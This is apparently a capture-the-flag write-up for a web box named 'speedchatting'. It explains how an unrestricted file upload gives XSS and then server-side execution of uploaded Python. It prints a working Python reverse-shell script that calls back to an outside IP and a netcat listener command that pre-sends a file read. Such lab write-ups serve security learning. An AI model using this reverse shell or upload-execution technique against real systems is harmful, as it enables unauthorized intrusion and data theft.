# speedchatting

exploring the app:

- upload picture /upload_profile_pic
- send message /api/send_message
- get messages /api/messages (every 3s)

---

- text messages as text elements (no xss in chat)
- we can upload any file!

unrestricted file upload:

we can upload any file type and will get a file in /uploads/profile_SOMEUUID.EXT

browsing to this file will also give us the correct content-type, which gives us full xss

[xss](/images/20260315_22h06m29s_grim.png)

---

the backend uses python ("Werkzeug/3.1.5 Python/3.10.12"), so how do we get a web/reverse shell?

unlike php, we cannot just make a browsable page that executes server side code, and I wasn't really sure how i could get python code execution.

as a result i spent a little while wondering if the solution actually was xss and I needed to capture data from some hidden account function. this kind of makes sense if you consider the hints that the service is meant to protect 'private conversations', or if it included some sort of race condition (because of the name)

but none of this leads anywhere, even if we have full xss we can't get a link or any way to load it in the chat (where the bot would presumably be watching). even if we could there really doesn't seem to be any private data involved

---

since this is an easy box and the flaw is likely tied directly to the unrestricted file upload, we should try to understand the file upload behavior

we can try uploading a python reverse shell just to see what happens. I hadn't even tried this at first because I assumed there was no way the server was executing the contents of any uploaded files.

```python
import sys,socket,os,pty

RHOST="192.168.207.250"
RPORT=1337

s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("sh")
```

we don't get anything right away, but after waiting and/or causing some actions on the site we see a connection:

[first shell](/images/20260315_22h36m48s_grim.png)

so the server literally is just executing our file. probably via some combination of eval and read. this was kind of frustrating to me because it is so stupid, but its just a lesson to consider everything

however the connection closes after a second or two, so we need to get our commands in fast:

[speed hacking](/images/20260315_22h39m57s_grim.png)

this is where the name and hint "speed chatting" and "can you hack as fast as you can chat?" come from

we can use a little bash trick `<<<` (here-string) to essentially prefire our command and send it through as soon as the connection opens

`nc -lvnp 1337 <<< "cat flag.txt"`

